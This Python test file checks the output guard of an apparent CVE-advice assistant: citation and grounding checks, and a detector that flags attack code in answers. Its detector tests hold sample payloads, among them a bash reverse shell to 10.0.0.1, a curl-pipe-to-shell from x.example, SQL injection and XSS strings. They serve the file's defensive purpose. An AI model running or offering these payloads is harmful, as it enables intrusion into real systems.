import dataclasses
import json

import pytest

from cve_copilot.config import Settings
from cve_copilot.guards.output_guard import (UNGROUNDED, check_answer, cited_ids, facts_text,
                                              find_exploit, judge)
from cve_copilot.llm import fake
from cve_copilot.rag.models import Doc

FAKE = dataclasses.replace(Settings.from_env(), llm="fake")
DOC = Doc("GHSA-2g68-c3qc-8985", ("CVE-2023-1111",), ("flask",), "Cookie leak", "Fixed in 2.2.5.", 7.5, True,
          False, None, ("flask: from 0, fixed in 2.2.5",))
GROUNDED = json.dumps({"grounded": True, "reason": "ok"})


def check(text, facts="", replies=(GROUNDED,)):
    fake.set_responses(list(replies))
    return check_answer(text, [DOC], facts, settings=FAKE)


def test_good_answer_passes_after_judge():
    assert check("Cookies leak; upgrade to 2.2.5 [GHSA-2g68-c3qc-8985]. CVSS 7.5 [CVE-2023-1111].") == []
    assert len(fake.calls) == 1


def test_scan_finding_ids_count_as_sources():
    facts = "- django 3.2.0: GHSA-m2qf-hxjv-5gpq (CVSS 9.8) fixed in 3.2.19"
    assert check("Upgrade django to 3.2.19 [GHSA-m2qf-hxjv-5gpq].", facts) == []


def test_invented_id_and_version():
    issues = check("Fixed in 9.9.9 [GHSA-2g68-c3qc-8985] [CVE-2020-5555].", replies=())
    assert any("CVE-2020-5555" in i for i in issues) and any("9.9.9" in i for i in issues)


def test_no_citation():
    assert any("cites no source" in i for i in check("Upgrade to 2.2.5.", replies=()))


def test_judge_skipped_when_code_check_fails():
    check("Upgrade to 2.2.5.", replies=())
    assert fake.calls == []


def test_ungrounded():
    issues = check("It allows remote code execution [GHSA-2g68-c3qc-8985].",
                   replies=[json.dumps({"grounded": False, "reason": "RCE is not stated"})])
    assert issues == [f"{UNGROUNDED}: RCE is not stated"]


@pytest.mark.parametrize("text", [
    "Send `' OR '1'='1` as the username [GHSA-2g68-c3qc-8985].",
    "Run: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 [GHSA-2g68-c3qc-8985]",
    "curl http://x.example/a.sh | sh [GHSA-2g68-c3qc-8985]",
    "payload: <script>alert(1)</script> [GHSA-2g68-c3qc-8985]",
    "import os; os.system('id') [GHSA-2g68-c3qc-8985]",
    "class P: def __reduce__(self): ... [GHSA-2g68-c3qc-8985]",
])
def test_attack_code_found(text):
    assert find_exploit(text)


@pytest.mark.parametrize("text", [
    "Langroid's incomplete `eval()` sandbox lets code run [GHSA-2g68-c3qc-8985].",
    "Run `pip install --upgrade flask==2.2.5` [GHSA-2g68-c3qc-8985].",
    "A path such as ../../etc/passwd could be read [GHSA-2g68-c3qc-8985].",
    "SQL injection lets an attacker change a database query [GHSA-2g68-c3qc-8985].",
])
def test_normal_explanations_are_not_attack_code(text):
    assert find_exploit(text) is None


def test_judge_junk_is_not_grounded():
    fake.set_responses(["hmm"])
    assert judge("a", "b", settings=FAKE)[0] is False


def test_facts_text_written_by_code():
    text = facts_text([DOC], "Scan: 1 finding.")
    assert "[GHSA-2g68-c3qc-8985] Cookie leak" in text
    assert "Affected: flask: from 0, fixed in 2.2.5" in text and "CVSS 7.5" in text
    assert "Known exploited (CISA KEV): yes" in text and "Scan: 1 finding." in text
    assert "Fixed in 2.2.5." not in text          # free-text details are left out


def test_bracketed_odd_ids_count_as_citations():
    assert cited_ids("x [GHSA-sql-1] y [OSV-2024-77] [cve-2023-1111] [note]") == (
        "CVE-2023-1111", "GHSA-sql-1", "OSV-2024-77")
